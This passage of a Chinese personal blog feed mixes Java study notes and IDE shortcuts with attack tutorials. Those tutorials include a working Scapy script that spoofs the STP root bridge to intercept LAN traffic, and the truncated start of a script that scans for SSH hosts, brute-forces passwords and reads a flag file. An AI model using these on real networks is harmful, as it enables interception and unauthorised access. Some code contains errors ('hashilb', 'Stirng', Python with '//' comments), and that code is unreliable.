    <content type="html"><![CDATA[<h1 id="Object类中的常用方法"><a href="#Object类中的常用方法" class="headerlink" title="Object类中的常用方法"></a>Object类中的常用方法</h1><ul><li>类名.getClass()<blockquote><p>获取这个类对象的字节码</p></blockquote></li><li><p>字节码名.getName()</p><blockquote><p>获取类的名称</p></blockquote></li><li><p>.equals(对象)</p><blockquote><p>判断<code>调用此方法的对象</code>和<code>传入对象</code>的值是否一样</p></blockquote></li></ul><ul><li>toString方法<blockquote><p>这是object里的方法，默认打印有@的内容(<code>其实是这个对象在堆内存中的地址值</code>)，因为<code>所有类都是默认继承Object类的</code>，所以重写它可以更好的显示属性值。</p><p>注：直接打印输出某个对象的引用那么<code>系统默认</code>会直接调用<code>该对象</code>的toString显示属性值，如果该类<code>没有重写</code>toString方法，默认打印该类在<code>堆内存中的地址值</code>。</p></blockquote></li></ul><a id="more"></a><h1 id="重写toString代码示例："><a href="#重写toString代码示例：" class="headerlink" title="重写toString代码示例："></a>重写toString代码示例：</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Stirng <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> name + <span class="string">","</span> + age;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="equals方法"><a href="#equals方法" class="headerlink" title="equals方法"></a>equals方法</h1><ul><li>equals方法默认是比较<code>地址值</code>，然而每个对象的地址值肯定是不一样的，所以如果调用equals方法的对象<code>没有重写equals</code>，那么调用它是无意义的。</li></ul><h1 id="重写equals代码演示："><a href="#重写equals代码演示：" class="headerlink" title="重写equals代码演示："></a>重写equals代码演示：</h1><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//重写equals方法</span></span><br><span class="line"><span class="keyword">public</span> boolean equals(Object obj) &#123;</span><br><span class="line">Student  s = (Student)obj;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">this</span>.name.equals(s.name) &amp;&amp;<span class="keyword">this</span>.age == s.age;<span class="comment">//这里的equals调用的是string里的方法</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>==号和equsls的区别（面试可能问道）：<br>    1、==号可以比较基本数据类型，也可以比较应用数据类型，比较基本数据类向的值时比较的是</p><p>数据值，比较引用数据类型比较的是地址的值<br>    2、equals只能比较引用数据类型，即比较地址的值，基层还是依赖==号，默认的equal方法没</p><p>有意义，但是我们可以重写它使其有意义。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Object类中的常用方法&quot;&gt;&lt;a href=&quot;#Object类中的常用方法&quot; class=&quot;headerlink&quot; title=&quot;Object类中的常用方法&quot;&gt;&lt;/a&gt;Object类中的常用方法&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;类名.getClass()&lt;blockquote&gt;
&lt;p&gt;获取这个类对象的字节码&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;字节码名.getName()&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;获取类的名称&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;.equals(对象)&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;判断&lt;code&gt;调用此方法的对象&lt;/code&gt;和&lt;code&gt;传入对象&lt;/code&gt;的值是否一样&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;toString方法&lt;blockquote&gt;
&lt;p&gt;这是object里的方法，默认打印有@的内容(&lt;code&gt;其实是这个对象在堆内存中的地址值&lt;/code&gt;)，因为&lt;code&gt;所有类都是默认继承Object类的&lt;/code&gt;，所以重写它可以更好的显示属性值。&lt;/p&gt;
&lt;p&gt;注：直接打印输出某个对象的引用那么&lt;code&gt;系统默认&lt;/code&gt;会直接调用&lt;code&gt;该对象&lt;/code&gt;的toString显示属性值，如果该类&lt;code&gt;没有重写&lt;/code&gt;toString方法，默认打印该类在&lt;code&gt;堆内存中的地址值&lt;/code&gt;。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
    
    
      <category term="Object类" scheme="http://liuhaoan.github.io/tags/Object%E7%B1%BB/"/>
    
  </entry>
  
  <entry>
    <title>javaSE复习之——Idea常用快捷键</title>
    <link href="http://liuhaoan.github.io/2019/04/09/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94Idea%E5%B8%B8%E7%94%A8%E5%BF%AB%E6%8D%B7%E9%94%AE/"/>
    <id>http://liuhaoan.github.io/2019/04/09/javaSE复习之——Idea常用快捷键/</id>
    <published>2019-04-09T07:14:05.000Z</published>
    <updated>2019-04-09T07:19:06.850Z</updated>
    
    <content type="html"><![CDATA[<p>暂时就这些吧</p><ul><li><p>alt+enter</p><blockquote><p>导入包，代码自动修正</p></blockquote></li><li><p>alt + /</p><blockquote><p>代码提示</p></blockquote></li></ul><a id="more"></a><ul><li>ctrl+Y    <blockquote><p>删除光标所在行</p></blockquote></li></ul><ul><li>ctrl+D    <blockquote><p>复制光标所在行，并且粘贴在它的下面</p></blockquote></li></ul><ul><li>ctrl+alt+L    <blockquote><p>格式化代码</p></blockquote></li></ul><ul><li>ctrl+/    <blockquote><p>单行注释</p></blockquote></li></ul><ul><li>Ctrl+shift+/<blockquote><p>选中行注释，多行注释</p></blockquote></li></ul><ul><li>alt+ins<blockquote><p>自动生成代码，get、set等</p></blockquote></li></ul><ul><li>alt+shift+上下箭<blockquote><p>移动当前代码行</p></blockquote></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;暂时就这些吧&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;alt+enter&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;导入包，代码自动修正&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;alt + /&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;代码提示&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
    
    
      <category term="idea快捷键" scheme="http://liuhaoan.github.io/tags/idea%E5%BF%AB%E6%8D%B7%E9%94%AE/"/>
    
  </entry>
  
  <entry>
    <title>javaSE复习之——Eclipse常用快捷键</title>
    <link href="http://liuhaoan.github.io/2019/04/09/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94Eclipse%E5%B8%B8%E7%94%A8%E5%BF%AB%E6%8D%B7%E9%94%AE/"/>
    <id>http://liuhaoan.github.io/2019/04/09/javaSE复习之——Eclipse常用快捷键/</id>
    <published>2019-04-09T07:00:39.000Z</published>
    <updated>2019-04-09T07:31:25.025Z</updated>
    
    <content type="html"><![CDATA[<p>常用的应该就这些了</p><p>Alt + / 起到提示的作用，功能很强大，忘记代码可以用。 </p><p>ctrl + n 新建<br><a id="more"></a><br>ctrl + shift + f 格式化代码，使代码更简洁 </p><p>ctrl + / 注释 也可以ctrl + shift + /或\ </p><p>F3或ctrl + 鼠标点击 查看源码 </p><p>ctrl + 1 给建议 </p><p>alt + shift + m 抽取一段代码成方法，省去了复制 </p><p>alt + shift + r 改名，在改变量是非常好用</p><p>shift + alt + s 生成toString</p><p>Alt+Shift+C 修改函数结构(比较实用,有N个函数调用了这个方法,修改一次搞定)</p><p>Ctrl+D: 删除当前行  </p><p>Ctrl+Alt+↓ 复制当前行到下一行(复制增加) </p><p>Ctrl+Alt+↑ 复制当前行到上一行(复制增加) </p><p>Alt+↓ 当前行和下面一行交互位置(特别实用,可以省去先剪切,再粘贴了) </p><p>Alt+↑ 当前行和上面一行交互位置(同上)</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;常用的应该就这些了&lt;/p&gt;
&lt;p&gt;Alt + / 起到提示的作用，功能很强大，忘记代码可以用。 &lt;/p&gt;
&lt;p&gt;ctrl + n 新建&lt;br&gt;
    
    </summary>
    
      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
    
    
      <category term="Eclipse快捷键" scheme="http://liuhaoan.github.io/tags/Eclipse%E5%BF%AB%E6%8D%B7%E9%94%AE/"/>
    
  </entry>
  
  <entry>
    <title>网络攻防之——Python实现生成树协议(STP)欺骗攻击</title>
    <link href="http://liuhaoan.github.io/2019/04/09/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E4%B9%8B%E2%80%94%E2%80%94Python%E5%AE%9E%E7%8E%B0%E7%94%9F%E6%88%90%E6%A0%91%E5%8D%8F%E8%AE%AE%E6%AC%BA%E9%AA%97%E6%94%BB%E5%87%BB/"/>
    <id>http://liuhaoan.github.io/2019/04/09/网络攻防之——Python实现生成树协议欺骗攻击/</id>
    <published>2019-04-09T02:09:48.000Z</published>
    <updated>2019-04-09T06:54:07.448Z</updated>
    
    <content type="html"><![CDATA[<h1 id="何为生成树协议欺骗攻击？"><a href="#何为生成树协议欺骗攻击？" class="headerlink" title="何为生成树协议欺骗攻击？"></a>何为生成树协议欺骗攻击？</h1><ul><li>所谓的生成树协议就是：通过BPDU来选举根桥或者非根桥，且当网络收敛完毕后，根桥会一直发送BPDU来确定下游设备之间的关系<blockquote><p>我们要做的就是把自己伪造成根桥，这样这个局域网的流量都走我们的攻击机过啦。</p></blockquote></li></ul><h1 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h1><a id="more"></a><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line">from scapy.all import *</span><br><span class="line"></span><br><span class="line"><span class="section">//01:80:c2:00:00:00这个是一个组播地址</span></span><br><span class="line"></span><br><span class="line">eth = Dot3(dst=<span class="string">"01:80:c2:00:00:00"</span>, src=<span class="string">"自己的MAC地址"</span>)</span><br><span class="line"></span><br><span class="line">llc = LLC()</span><br><span class="line"></span><br><span class="line">stp = STP(rootid=0, rootmac=<span class="string">"自己的MAC地址"</span>, bridgeid=0, bridgemac=<span class="string">"自己的MAC地址"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">pkt=sendp(eth/llc/stp,inter=2,loop=1)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;何为生成树协议欺骗攻击？&quot;&gt;&lt;a href=&quot;#何为生成树协议欺骗攻击？&quot; class=&quot;headerlink&quot; title=&quot;何为生成树协议欺骗攻击？&quot;&gt;&lt;/a&gt;何为生成树协议欺骗攻击？&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;所谓的生成树协议就是：通过BPDU来选举根桥或者非根桥，且当网络收敛完毕后，根桥会一直发送BPDU来确定下游设备之间的关系&lt;blockquote&gt;
&lt;p&gt;我们要做的就是把自己伪造成根桥，这样这个局域网的流量都走我们的攻击机过啦。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&quot;代码示例&quot;&gt;&lt;a href=&quot;#代码示例&quot; class=&quot;headerlink&quot; title=&quot;代码示例&quot;&gt;&lt;/a&gt;代码示例&lt;/h1&gt;
    
    </summary>
    
      <category term="网络攻防" scheme="http://liuhaoan.github.io/categories/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/"/>
    
    
      <category term="Python" scheme="http://liuhaoan.github.io/tags/Python/"/>
    
      <category term="网络攻防" scheme="http://liuhaoan.github.io/tags/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/"/>
    
      <category term="生成树协议欺骗" scheme="http://liuhaoan.github.io/tags/%E7%94%9F%E6%88%90%E6%A0%91%E5%8D%8F%E8%AE%AE%E6%AC%BA%E9%AA%97/"/>
    
  </entry>
  
  <entry>
    <title>javaSE复习之——面向对象_内部类</title>
    <link href="http://liuhaoan.github.io/2019/04/08/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1-%E5%86%85%E9%83%A8%E7%B1%BB/"/>
    <id>http://liuhaoan.github.io/2019/04/08/javaSE复习之——面向对象-内部类/</id>
    <published>2019-04-08T05:22:50.000Z</published>
    <updated>2019-04-08T11:51:45.602Z</updated>
    
    <content type="html"><![CDATA[<h1 id="内部类的概述"><a href="#内部类的概述" class="headerlink" title="内部类的概述"></a>内部类的概述</h1><ul><li>内部类就是在一个类中定义的另一个类。<ul><li>ps：刚开始学java对于内部类用到的着实不多，但随着编程能力的提高，我们会领悟到它魅力的所在</li></ul></li></ul><a id="more"></a><h1 id="内部类的分类"><a href="#内部类的分类" class="headerlink" title="内部类的分类"></a>内部类的分类</h1><h4 id="成员内部类"><a href="#成员内部类" class="headerlink" title="成员内部类"></a><code>成员</code>内部类</h4><blockquote><p>它定义在一个<code>类</code>的内部</p></blockquote><h4 id="局部内部类"><a href="#局部内部类" class="headerlink" title="局部内部类"></a><code>局部</code>内部类</h4><blockquote><p>它定义在一个<code>方法</code>或者<code>一个作用域</code>内部，它的<code>访问仅限于</code>方法内或者该作用域内</p><p>注意事项：</p><p>局部内部类就像是方法里面的一个局部变量一样，是不能有public、protected、private以及static修饰符的</p></blockquote><h4 id="匿名内部类"><a href="#匿名内部类" class="headerlink" title="匿名内部类"></a><code>匿名</code>内部类</h4><blockquote><p>匿名内部类应该是平时我们编写代码时<code>用得最多的</code>，在编写<code>事件监听</code>的代码时使用匿名内部类不但方便，而且使代码更加<code>容易维护</code></p><p>例如：为按钮设置一个监听器<br><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> OnClickListener() &#123;</span><br><span class="line">         </span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">            <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">             </span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p></blockquote><h4 id="静态内部类"><a href="#静态内部类" class="headerlink" title="静态内部类"></a><code>静态</code>内部类</h4><blockquote><p>它是定义在另一个类里面的类，只不过在类的前面多了一个关键字static</p></blockquote><h1 id="内部类的面试题之-——-内部类能不能访问外部类成员变量？"><a href="#内部类的面试题之-——-内部类能不能访问外部类成员变量？" class="headerlink" title="内部类的面试题之 —— 内部类能不能访问外部类成员变量？"></a>内部类的面试题之 —— <code>内部类</code>能不能访问<code>外部类</code>成员变量？</h1><ul><li><p>答（成员内部类）：</p><blockquote><p><code>内部类</code>可以访问<code>外部类</code>的成员变量，因为编译器底层在创建<code>成员内部类</code>时，为成员内部类加上了指向外部类的引用</p><p>示例：</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">外部类.<span class="keyword">this</span>.成员变量</span><br><span class="line">外部类.<span class="keyword">this</span>.成员方法</span><br></pre></td></tr></table></figure></blockquote></li><li><p>ps：虽然内部类访问外部类可以随心所欲，但是外部类想要访问内部类就需要创建内部类实例然后利用对它的引用进行访问了</p></li><li>例子：</li></ul><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title">Circle</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">double</span> radius = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Circle</span>(<span class="params"><span class="keyword">double</span> radius</span>)</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.radius = radius;</span><br><span class="line">        getDrawInstance().drawSahpe();</span><br><span class="line"><span class="comment">//必须先创建成员内部类的对象，再进行访问</span></span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="function"><span class="keyword">private</span> Draw <span class="title">getDrawInstance</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Draw();</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">class</span> <span class="title">Draw</span> &#123;     <span class="comment">//内部类</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">drawSahpe</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">            System.<span class="keyword">out</span>.println(radius);</span><br><span class="line"><span class="comment">//外部类的private成员</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="匿名内部类访问外部类成员底层实现原理："><a href="#匿名内部类访问外部类成员底层实现原理：" class="headerlink" title="匿名内部类访问外部类成员底层实现原理："></a><code>匿名内部类</code>访问外部类成员底层实现原理：</h1><blockquote><p>我们用一段代码来举例：<br><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Test</span> &#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span>(<span class="params">String[] args</span>)</span>  &#123;</span><br><span class="line">         </span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        final <span class="keyword">int</span> a = <span class="number">10</span>;</span><br><span class="line">        <span class="keyword">new</span> Thread()&#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">                System.<span class="keyword">out</span>.println(a);</span><br><span class="line">            &#125;;</span><br><span class="line">        &#125;.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p></blockquote><blockquote><p>当test方法调用，系统会给内部类自动加上构造器<code>（这也就是为什么匿名内部类不能有构造方法的原因）</code>，这个构造器含有两个参数，一个指向外部类对象的引用，一个是int类型变量，这个int类型变量就是外部类中那个int变量的拷贝，它的值也就是10，同理如果是一个引用数据类型的话，那就是一个在堆内存中的地址值。<code>这样就解决了生命周期的问题</code></p><p><code>但是还有一个数据不一致的问题</code>，如果内部类或者外部类修改了这个变量的值，那么对方是不可能知道的，所以造成了数据不一致的问题。</p><p>数据不一致问题的<code>解决方法</code>就是直接给变量修饰一个final，这就是为什么匿名内部类访问外部类中的变量时，这个变量一定要final修饰的原因</p></blockquote><ul><li>在jdk8之前，局部内部类访问外部类成员变量，那么外部类的那个变量就需要用<code>final</code>修饰</li><li>jdk8新特性<blockquote><p>局部内部类与匿名内部类访问外部类成员变量，外部类那个变量<code>不需要</code>final修饰了，但其实只是个“语法糖”，只要有对这个成员变量修改的操作，还是会强制要求final修饰的。</p></blockquote></li></ul><h1 id="匿名内部类-1"><a href="#匿名内部类-1" class="headerlink" title="匿名内部类"></a>匿名内部类</h1><ul><li>格式：</li></ul><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//如果是类那么就代表继承这个类，是抽象类那么就是实现这个抽象方法</span></span><br><span class="line"><span class="keyword">new</span> <span class="type"></span>类名或者抽象类名() &#123;</span><br><span class="line"></span><br><span class="line">&#125;.方法名（）</span><br><span class="line"><span class="comment">//.方法名()可有无，只是加上可以直接调用匿名内部类中的方法</span></span><br></pre></td></tr></table></figure><ul><li><p>解释：</p><blockquote><p>可以吧<code>new 到  }</code> 的代码看作创建的一个子类对象实例，所以后面可以<code>.方法名</code>调用</p></blockquote></li><li><p>好处：</p><blockquote><p>可以不用声明一个类了，而且把代码都集成到了一起，可以使代码更加简洁。</p></blockquote></li><li><p>注意事项：</p><blockquote><p>1、<code>匿名内部类</code>只针对重写<code>一个方法</code>使用，如果要一次性重写<code>多个方法</code>的话不使用，因为调用一次就要创建一次对象，这样就没必要使用匿名内部类了，如果要多次使用则<code>重新定义类</code>。</p><p>2、匿名内部类可以当作参数传递，本质是把匿名内部类看作一个子类对象。</p><p>3、匿名内部类中不能定义构造函数。</p><p>4、使用匿名内部类时，我们必须是<code>继承一个类</code>或者<code>实现一个接口</code>，但是两者不可兼得，只能继承一个类或者实现一个接口。</p><p>5、匿名内部类中不能存在任何的静态成员变量和静态方法。</p><p>6、匿名内部类<code>属于</code>局部内部类，所以局部内部类<code>所有限制</code>都在匿名内部类上生效</p><p>7、匿名内部类不能是抽象的，它<code>必须实现</code>继承的类或者接口中的抽象方法</p></blockquote></li></ul><h1 id="链式编程："><a href="#链式编程：" class="headerlink" title="链式编程："></a>链式编程：</h1><ul><li>特点：<blockquote><p>调用方法后还能调用方法，也就是说调用第一个方法之后返回的是一个对象。</p></blockquote></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;内部类的概述&quot;&gt;&lt;a href=&quot;#内部类的概述&quot; class=&quot;headerlink&quot; title=&quot;内部类的概述&quot;&gt;&lt;/a&gt;内部类的概述&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;内部类就是在一个类中定义的另一个类。&lt;ul&gt;
&lt;li&gt;ps：刚开始学java对于内部类用到的着实不多，但随着编程能力的提高，我们会领悟到它魅力的所在&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
    
    
      <category term="面向对象" scheme="http://liuhaoan.github.io/tags/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/"/>
    
      <category term="内部类" scheme="http://liuhaoan.github.io/tags/%E5%86%85%E9%83%A8%E7%B1%BB/"/>
    
      <category term="匿名内部类" scheme="http://liuhaoan.github.io/tags/%E5%8C%BF%E5%90%8D%E5%86%85%E9%83%A8%E7%B1%BB/"/>
    
      <category term="链式编程" scheme="http://liuhaoan.github.io/tags/%E9%93%BE%E5%BC%8F%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>网络攻防之——Python实现MD5加密</title>
    <link href="http://liuhaoan.github.io/2019/04/08/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E4%B9%8B%E2%80%94%E2%80%94Python%E5%AE%9E%E7%8E%B0MD5%E5%8A%A0%E5%AF%86/"/>
    <id>http://liuhaoan.github.io/2019/04/08/网络攻防之——Python实现MD5加密/</id>
    <published>2019-04-08T02:27:04.000Z</published>
    <updated>2019-04-08T11:47:03.871Z</updated>
    
    <content type="html"><![CDATA[<h1 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h1><a id="more"></a><figure class="highlight d"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> hashilb</span><br><span class="line"></span><br><span class="line">str = input(“请输入要解密的字符串：”)</span><br><span class="line">md5 = hashlib.md5()</span><br><span class="line"><span class="comment">//创建MD5加密对象</span></span><br><span class="line"></span><br><span class="line">md5.update(str.encode(<span class="string">"utf-8"</span>))</span><br><span class="line"><span class="comment">//把字符串以“utf-8”编码的形式传给MD5对象进行MD5加密</span></span><br><span class="line"></span><br><span class="line">print(md5.hexdigest())</span><br><span class="line"><span class="comment">//获取MD5加密后的16进制输出打印</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;代码示例&quot;&gt;&lt;a href=&quot;#代码示例&quot; class=&quot;headerlink&quot; title=&quot;代码示例&quot;&gt;&lt;/a&gt;代码示例&lt;/h1&gt;
    
    </summary>
    
      <category term="网络攻防" scheme="http://liuhaoan.github.io/categories/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/"/>
    
    
      <category term="MD5加密" scheme="http://liuhaoan.github.io/tags/MD5%E5%8A%A0%E5%AF%86/"/>
    
      <category term="Python" scheme="http://liuhaoan.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>网络攻防之——Python实现ssh端口扫描并爆破</title>
    <link href="http://liuhaoan.github.io/2019/04/08/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E4%B9%8B%E2%80%94%E2%80%94Python%E5%AE%9E%E7%8E%B0ssh%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%B9%B6%E7%88%86%E7%A0%B4/"/>
    <id>http://liuhaoan.github.io/2019/04/08/网络攻防之——Python实现ssh端口扫描并爆破/</id>
    <published>2019-04-08T02:23:38.000Z</published>
    <updated>2019-04-09T02:02:24.884Z</updated>
    
    <content type="html"><![CDATA[<h1 id="实现步骤"><a href="#实现步骤" class="headerlink" title="实现步骤"></a>实现步骤</h1><blockquote><p>1、循环遍历出所有网段ip<br>2、利用多线程多并发同时探测22端口<br>3、把探测出来的存活机进行密码爆破<br>4、爆破成功则去拿到主机文件并保存ip、密码等信息<br>5、爆破不成功则记录该ip，进行后续操作。</p></blockquote><h1 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h1><a id="more"></a><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line">import threading</span><br><span class="line">import pexpect</span><br><span class="line"><span class="keyword">from</span> socket import *</span><br><span class="line"></span><br><span class="line">key = [pexpect.TIMEOUT, <span class="string">"#"</span>, <span class="string">"\$"</span>, <span class="string">"&gt;"</span>, <span class="string">"&gt;&gt;&gt;"</span>, <span class="string">"&amp;"</span>]</span><br><span class="line">loginKey = [pexpect.TIMEOUT, <span class="string">"[p|P]assword"</span>, <span class="string">"yes"</span>]</span><br><span class="line"></span><br><span class="line">def getFlag(p, ret):</span><br><span class="line">p.sendline(<span class="string">"cat ../../../../flag"</span>)</span><br><span class="line">p.expect(key)</span><br><span class="line">ret += <span class="string">"flag:\n"</span> + str(p.before)</span><br><span class="line"><span class="builtin-name">print</span>(ret)</span><br><span class="line">file = open(<span 